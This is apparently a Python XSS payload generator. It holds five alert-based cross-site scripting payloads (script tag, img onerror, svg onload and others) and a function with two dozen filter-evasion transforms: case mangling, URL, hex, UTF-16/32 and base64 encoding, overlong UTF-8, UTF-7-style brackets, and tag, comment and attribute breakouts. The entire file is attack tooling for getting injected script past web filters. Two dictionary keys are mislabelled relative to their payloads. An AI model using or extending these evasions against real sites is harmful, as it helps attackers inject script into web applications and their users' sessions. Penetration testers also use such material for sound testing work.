#!/usr/bin/python3

# global imports
import base64
import urllib.parse
import html

# types of payloads
types = {
    "basic": "<script>alert(1)</script>",
    "div": "<div onpointerover='alert(1)'>xss</div>",
    "img": "<img src=x onerror=alert('1');>",
    "body": "<svg onload=alert('1')>",
    "svg": "<body ontouchstart=alert(1)>",
}

# function to generate a payload
def get_payload(payload, code):
    if code == 0:
        return payload
    if code == 1:
        return payload.upper()
    elif code == 2:
        return payload.replace("s", "S").replace("r", "R").replace("p", "P")
    elif code == 3:
        return urllib.parse.quote(payload).replace("/", "%2F")
    elif code == 4:
        return html.escape(payload)
    elif code == 5:
        return payload.replace("script", "scri</script>pt>")
    elif code == 6:
        return payload.encode("utf-8").hex()
    elif code == 7:
        return payload.encode("utf-16").hex()
    elif code == 8:
        return payload.encode("utf-32").hex()
    elif code == 9:
        a = "\";alert('XSS');//"
        return a
    elif code == 10:
        return payload.replace("<", "%uff1c").replace(">", "%uff1e")
    elif code == 11:
        return payload.replace("<", "¼").replace(">", "¾").replace("\"", "¢")
    elif code == 12:
        a = payload.encode('ascii')
        b = base64.b64encode(a)
        return b.decode('ascii')
    elif code == 13:
        return payload.replace("<", "+ADw-").replace(">", "+AD4-")
    elif code == 14:
        return payload.replace("(", "`").replace(")", "`")
    elif code == 15:
        return payload.replace("<", "%C0%BC").replace(">", "%C0%BE").replace("'", "%CA%B9").replace("(", "%CA%B9")
    elif code == 16:
        return "\">" +payload 
    elif code == 17:
        return "</script>" +payload 
    elif code == 18:
        return "\">" + payload + ".gif"
    elif code == 19:
        return "<!-->" + payload + "-->"
    elif code == 20:
        return "<noscript><p title=\"</noscript>" + payload + "\">"
    elif code == 21:
        return "<IMG \"\"\">" + payload + "\">"
    elif code == 22:
        return payload.replace(" ", "^L")
    elif code == 23:
        return "<!--[if gte IE 4]>" + payload + "<![endif]-->"  
    
